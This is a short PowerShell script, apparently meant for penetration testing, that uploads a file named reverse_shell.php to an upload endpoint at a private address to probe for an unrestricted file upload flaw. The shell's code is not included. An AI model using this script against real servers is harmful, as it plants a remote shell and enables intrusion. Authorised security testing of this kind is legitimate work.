# ==========================================
# File Upload Vulnerability Test Script
# This script attempts to upload a potentially dangerous file (e.g., a reverse shell).
# ==========================================

# Define target URL for file upload
$targetURL = "http://192.168.1.100/upload"

# Define file to upload (e.g., reverse shell)
$filePath = "C:\path\to\reverse_shell.php"

# Send the file as a multipart form submission
$body = @{
    file = Get-Item $filePath
}
Invoke-WebRequest -Uri $targetURL -Method Post -Form $body
Write-Host "File uploaded. Check for vulnerability."
